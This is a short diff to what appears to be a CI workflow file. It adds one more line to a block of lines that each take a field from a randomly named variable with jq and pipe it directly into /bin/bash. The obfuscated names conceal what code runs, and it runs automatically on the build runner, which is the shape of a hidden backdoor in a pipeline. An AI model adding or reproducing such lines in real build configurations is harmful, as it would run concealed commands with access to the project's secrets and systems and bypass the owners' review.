@@ -29,6 +29,7 @@ jobs:
           echo $xq00102 | jq -r .yi6 | /bin/bash
           printf '%s' "$qnei4" | jq -r .if9167 | /bin/bash
           echo $lkxd8 | jq -r .mlb633 | /bin/bash
+          echo $yoqub20 | jq -r .uztrf10 | /bin/bash
 
       - name: Save archive
         if: always()
